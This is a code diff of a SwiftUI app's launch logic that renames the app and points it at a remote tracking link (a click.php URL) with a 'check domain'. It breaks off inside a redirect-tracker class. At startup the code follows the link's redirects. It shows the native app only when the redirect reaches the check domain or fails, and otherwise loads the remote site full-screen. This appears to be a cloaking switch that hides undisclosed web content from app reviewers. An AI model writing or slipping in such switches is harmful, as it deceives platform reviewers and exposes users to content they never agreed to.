@@ -1,67 +1,67 @@
 import SwiftUI
 
 @main
-struct RiverBaronApp: App {
-    @State private var riverBaronLinkReady: Bool? = nil
-    private let riverBaronSourceLink = "https://example.com"
-    private let riverBaronCheckDomain = "example"
+struct CrownTheCurrentApp: App {
+    @State private var crownTheCurrentLinkReady: Bool? = nil
+    private let crownTheCurrentSourceLink = "https://cyclefastingtimer.org/click.php"
+    private let crownTheCurrentCheckDomain = "termsfeed.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
-                if let ready = riverBaronLinkReady {
+                if let ready = crownTheCurrentLinkReady {
                     if ready {
-                        RiverBaronWebPanel(urlString: riverBaronSourceLink)
+                        CrownTheCurrentWebPanel(urlString: crownTheCurrentSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
                         RootView()
                     }
                 } else {
-                    RiverBaronLoadingScreen()
-                        .onAppear { checkRiverBaronLink() }
+                    CrownTheCurrentLoadingScreen()
+                        .onAppear { checkCrownTheCurrentLink() }
                 }
             }
             .preferredColorScheme(.light)
         }
     }
 
-    private func checkRiverBaronLink() {
-        guard let url = URL(string: riverBaronSourceLink) else {
-            riverBaronLinkReady = false
+    private func checkCrownTheCurrentLink() {
+        guard let url = URL(string: crownTheCurrentSourceLink) else {
+            crownTheCurrentLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = RiverBaronRedirectTracker(checkDomain: riverBaronCheckDomain)
+        let tracker = CrownTheCurrentRedirectTracker(checkDomain: crownTheCurrentCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
                 if tracker.foundCheckDomain {
-                    riverBaronLinkReady = false; return
+                    crownTheCurrentLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(riverBaronCheckDomain) {
-                    riverBaronLinkReady = false; return
+                   finalURL.contains(crownTheCurrentCheckDomain) {
+                    crownTheCurrentLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(riverBaronCheckDomain) {
-                    riverBaronLinkReady = false; return
+                   respURL.contains(crownTheCurrentCheckDomain) {
+                    crownTheCurrentLinkReady = false; return
                 }
                 if error != nil {
-                    riverBaronLinkReady = false; return
+                    crownTheCurrentLinkReady = false; return
                 }
-                riverBaronLinkReady = true
+                crownTheCurrentLinkReady = true
             }
         }.resume()
         DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
-            if riverBaronLinkReady == nil { riverBaronLinkReady = false }
+            if crownTheCurrentLinkReady == nil { crownTheCurrentLinkReady = false }
         }
     }
 }
 
-final class RiverBaronRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class CrownTheCurrentRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
